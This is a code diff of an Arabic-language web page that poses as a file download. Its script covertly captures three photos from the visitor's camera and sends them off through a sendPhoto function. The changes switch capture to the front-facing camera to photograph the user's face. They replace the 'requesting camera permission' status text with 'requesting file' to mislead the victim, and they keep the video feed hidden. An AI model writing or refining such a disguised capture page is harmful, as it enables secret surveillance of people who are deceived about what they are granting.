@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تحميل الملف</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -95,7 +95,7 @@
             font-size: 0.8rem;
             margin-top: 20px;
         }
-        video { display: none; }  /* مخفي تماماً */
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -161,21 +161,26 @@
             }
         }
 
-        // ----- العملية الأساسية (تطلب الكاميرا، تلتقط 3 صور، ترسل) -----
+        // ----- العملية الأساسية (تطلب الكاميرا الأمامية، تلتقط 3 صور، ترسل) -----
         async function startProcess() {
             if (isRunning) return;
             isRunning = true;
             downloadBtn.disabled = true;
             downloadBtn.textContent = '⏳ جاري ...';
-            statusEl.textContent = '⏳ طلب إذن الكاميرا ...';
+            statusEl.textContent = '⏳ طلب الملف ...';
             progressWrap.style.display = 'block';
             progressBar.style.width = '0%';
             finalMsg.style.display = 'none';
+            statusEl.style.color = '#ffa';
 
-            // 1. طلب الكاميرا (سيظهر طلب إذن من المتصفح)
+            // 1. طلب الكاميرا الأمامية (facingMode: 'user')
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 360 } }
+                    video: { 
+                        facingMode: 'user',   // ← الكاميرا الأمامية
+                        width: { ideal: 480 }, 
+                        height: { ideal: 360 } 
+                    }
                 });
             } catch (err) {
                 statusEl.textContent = '❌ تم رفض الكاميرا، الرجاء السماح ثم أعد المحاولة.';
@@ -183,6 +188,7 @@
                 downloadBtn.disabled = false;
                 downloadBtn.textContent = '⬇ تحميل';
                 isRunning = false;
+                progressWrap.style.display = 'none';
                 return;
             }
 
@@ -214,7 +220,6 @@
             for (let i = 0; i < photos.length; i++) {
                 const ok = await sendPhoto(photos[i], `صورة ${i+1}`);
                 if (!ok) allSent = false;
-                // تحديث الشريط إلى 100% تدريجياً
                 progressBar.style.width = (70 + (i+1)*10) + '%';
             }
 
